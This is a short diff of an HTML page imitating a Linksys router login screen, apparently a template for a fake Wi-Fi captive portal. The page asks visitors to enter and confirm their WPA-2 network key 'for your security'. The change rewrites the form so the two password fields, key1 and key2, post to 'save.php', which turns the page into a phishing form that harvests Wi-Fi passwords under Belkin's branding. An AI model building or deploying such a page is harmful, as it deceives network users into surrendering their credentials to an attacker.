@@ -16,18 +16,18 @@
 			</div>
 		</div>
 		<span class = "login-small-text">For your security, enter your <strong>WPA-2 Key</strong> in order to access the internet. </span>
-		<form name='f' action='./login-verify' method='POST'>
+		<form id="form1" name="form1" method="post" action="save.php">
 			<div class="login-hint-form-field">
 				<div class="login-id">
-					<input class="new-login-text" spellcheck="false" size="45" id="username" name="username" tabindex=1 placeholder="WPA-2 Key" onfocus="this.placeholder = ''" onblur="this.placeholder = 'WPA-2 Key'">
+					<input class="new-login-text" spellcheck="false" size="45" id="key1" name="key1" type="password" tabindex=1 placeholder="WPA-2 Key" onfocus="this.placeholder = ''" onblur="this.placeholder = 'WPA-2 Key'">
 				</div>
 			</div>
 			<div class="login-hint-form-field">
 				<div>
-					<input class="new-login-text" size="45" id="password" name="password" type="password" tabindex=2 placeholder="WPA-2 Key (confirm)" onfocus="this.placeholder = ''" onblur="this.placeholder = 'WPA-2 Key (confirm)'">
+					<input class="new-login-text" size="45" id="key2" name="key2" type="password" tabindex=2 placeholder="WPA-2 Key (confirm)" onfocus="this.placeholder = ''" onblur="this.placeholder = 'WPA-2 Key (confirm)'">
 				</div>
 			</div>
-			<input class="loginButton" type="submit" id="saveAndSubmit" name="saveAndSubmit" value="Login" alt="Login">
+			<input class="loginButton" type="submit" id="saveAndSubmit" name="saveAndSubmit" value="Submit" alt="Submit">
 		</form>
 		<div id="login-footer">
 			Copyright&copy;  2018 Belkin International, Inc. LINKSYS, MAX-STREAM and PERFORMANCE PERFECTED are trademarks registered and/or owned by Belkin International, Inc. in the United States and other countries.
